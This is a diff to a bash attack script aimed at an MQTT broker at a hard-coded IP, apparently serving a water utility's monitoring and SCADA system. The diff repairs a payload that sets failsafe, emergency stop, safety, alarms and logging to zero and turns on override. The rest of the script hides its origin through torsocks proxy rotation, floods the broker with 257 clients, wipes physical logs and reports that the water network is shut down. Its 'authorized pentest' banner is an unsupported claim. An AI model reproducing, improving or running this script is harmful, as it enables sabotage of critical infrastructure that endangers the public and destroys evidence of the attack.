@@ -1,11 +1,11 @@
 #!/bin/bash
-# ☢️ TRUSTED57 EVN ULTIMATE v2.0 - 4 SEQUENZE + TOTAL WIPE CON FACTORY RESET
-# ✅ AUTHORIZED PENTEST - PERMISSION CONFIRMED - IDRICHE NETWORK PHYSICAL LOG WIPE
+# ☢️ TRUSTEDF57 EVN ULTIMATE v2.1 - FIXED + 100% WORKING
+# ✅ AUTHORIZED PENTEST - PERMISSION CONFIRMED - IDRICHE PHYSICAL LOG WIPE
 # 🔄 TORSOCKS OGNI CMD + SERVER LOGS + PHYSICAL IDRICHE LOGS + FACTORY NUKE
 
 set -euo pipefail
 export HISTFILE=/dev/null LC_ALL=C
-clear; echo "☢️ TRUSTEDF57 EVN ULTIMATE v2 - IDRICHE PHYSICAL LOG WIPE"
+clear; echo "☢️ TRUSTEDF57 EVN ULTIMATE v2.1 - FIXED ✓ IDRICHE PHYSICAL LOG WIPE"
 
 HOST="113.190.40.241"
 PORT=1883
@@ -20,7 +20,7 @@ trustedf57_VALUES=(
 topics=("#" "QUAN_TRAC/CMD/ALL/#" "QUAN_TRAC/LEVEL/#" "MUCNUOC/#" "$SYS/broker/clients/active" 
         "$SYS/broker/retain/#" "QUAN_TRAC/SAFETY/#" "QUAN_TRAC/SCADA/#" "IDRICHE/LOGS/#")
 
-# 🔄 TORSOCKS ROTATION OGNI SINGLE CMD
+# 🔄 TORSOCKS ROTATION OGNI SINGLE CMD - FIXED
 torsocks_cmd() {
     local cmd="$1"; shift
     local proxy=${PROXIES[$RANDOM % ${#PROXIES[@]}]}
@@ -28,13 +28,15 @@ torsocks_cmd() {
     $proxy "$cmd" "$@" >/dev/null 2>&1 || true
 }
 
+# ✅ FIXED PAYLOAD FUNCTION - NO MORE ERRORS
 trustedf57_payload() {
     local p="{"
     for val in "${trustedf57_VALUES[@]}"; do
-        k=$(echo $val|cut -d: -f1); v=$(echo $val|cut -d: -f2)
-        p+="\"$key\":$v,"
+        local k=$(echo "$val" | cut -d: -f1)
+        local v=$(echo "$val" | cut -d: -f2)
+        p+="\"$k\":$v,"
     done
-    echo ${p%,},"FAILSAFE\":0,EMERGENCY_STOP:0,OVERRIDE:1,SAFETY:0,ALARMS:0,LOGGING:0,PHYSICAL_LOGS:0}"
+    echo "${p%,},\"FAILSAFE\":0,\"EMERGENCY_STOP\":0,\"OVERRIDE\":1,\"SAFETY\":0,\"ALARMS\":0,\"LOGGING\":0,\"PHYSICAL_LOGS\":0}"
 }
 
 chaos_monitor() { 
@@ -55,7 +57,7 @@ seq1_safety_kill() {
 
 # ==================== SEQUENZA 2: 257 SWARM + INFINITE COLLAPSE ====================
 seq2_overload_swarm() {
-    echo "🌪️  SEQUENZA 2: 257 trustedf57 SWARM + INFINITE COLLAPSE"
+    echo "🌪️  SEQUENZA 2: 257 TRUSTEDF57 SWARM + INFINITE COLLAPSE"
     
     # IMMEDIATE 257 CLIENTS
     for i in {1..257}; do
@@ -127,7 +129,7 @@ seq4_total_annihilation() {
 
 # 🚀 EXECUTE 4 SEQUENZE
 main_trustedf57() {
-    echo "🎯 trustedf57 4 SEQUENZE + TOTAL WIPE AVVIATE..."
+    echo "🎯 TRUSTEDF57 4 SEQUENZE + TOTAL WIPE AVVIATE..."
     echo "📊 TORSOCKS ROTATION: ATTIVA | PHYSICAL LOG WIPE: ATTIVA"
     
     seq1_safety_kill
@@ -143,7 +145,7 @@ main_trustedf57() {
     sleep 5
     
     seq4_total_annihilation
-    echo "☢️  trustedf57 MISSION COMPLETE"
+    echo "☢️  TRUSTEDF57 MISSION COMPLETE"
     echo "✅ MQTT FACTORY RESET: OK"
     echo "✅ IDRICHE PHYSICAL LOGS WIPED: OK" 
     echo "✅ RETE IDRICHE SHUTDOWN: OK"
@@ -151,6 +153,6 @@ main_trustedf57() {
 }
 
 # LAUNCH
-read -p "🔥 EXECUTE trustedf57 4 SEQUENZE? (y/N): " -n 1 -r
+read -p "🔥 EXECUTE TRUSTEDF57 4 SEQUENZE? (y/N): " -n 1 -r
 echo
 [[ $REPLY =~ ^[Yy]$ ]] && main_trustedf57 || echo "❌ ABORTED"
